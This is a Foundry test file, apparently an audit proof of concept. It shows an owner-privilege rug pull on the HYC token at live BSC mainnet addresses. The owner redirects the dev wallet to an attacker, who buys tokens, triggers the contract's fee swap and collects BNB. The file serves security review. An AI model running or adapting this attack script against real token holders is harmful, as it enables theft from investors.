```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interfaces for targeted functions
interface IHayyaWorldCup {
    function owner() external view returns (address);
    function setDevWallet(address _devWallet) external;
    function setMarketingWallet(address _marketingWallet) external;
    function setCommunityWallet(address _communityWallet) external;
    function devWallet() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function WETH() external pure returns (address);
}

contract ExploitTest is Test {
    // Mainnet addresses
    address constant HYC = 0x890C3Ca60A522505f65308785C7e36A60c6702B8;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    IHayyaWorldCup hyc = IHayyaWorldCup(HYC);
    IUniswapV2Router02 router = IUniswapV2Router02(ROUTER);
    address attacker = address(0xBAD);
    address owner;

    function setUp() public {
        // Identify the current owner of the token contract
        owner = hyc.owner();
        vm.label(owner, "Owner");
        vm.label(HYC, "HYC");
        vm.label(ROUTER, "PancakeRouter");
        vm.label(attacker, "Attacker");

        // Give attacker BNB to execute a buy
        deal(attacker, 100 ether);
    }

    function testCentralizationRisk_RugPull() public {
        // Step 1 – Owner changes the devWallet to the attacker's address
        vm.startPrank(owner);
        hyc.setDevWallet(attacker);
        vm.stopPrank();

        // Verify the change
        assertEq(hyc.devWallet(), attacker, "devWallet should be attacker");

        // Step 2 – Attacker performs a buy from the PancakeSwap pair,
        //         which adds fees to the contract and increases its token balance.
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = HYC;
        uint256 buyAmount = 1 ether; // 1 BNB
        uint256 expectedOut = 0; // accept any output
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            expectedOut,
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // Step 3 – Attacker transfers a tiny amount of HYC to trigger the contract's
        //         fee swapping logic. The contract will sell its accumulated tokens,
        //         and forward BNB to the fee wallets, including the attacker-controlled devWallet.
        uint256 hycBalance = hyc.balanceOf(attacker);
        require(hycBalance > 0, "Attacker must have received HYC tokens");

        uint256 contractInitialHyc = hyc.balanceOf(HYC);
        vm.prank(attacker);
        hyc.transfer(hyc.uniswapV2Pair(), 1); // send 1 wei back to pair to trigger swap

        // Step 4 – Assert that the attacker (as devWallet) received BNB from the fee distribution.
        uint256 attackerBnbFinal = attacker.balance;
        // The attacker started with 100 ether and spent 1 ether on the buy, so baseline ≈ 99 ether.
        // After the fee redistribution, the attacker should have more than 99 ether (received >0 BNB).
        assertGt(attackerBnbFinal, 99 ether, "Attacker should have received BNB from fee distribution");
    }
}
```
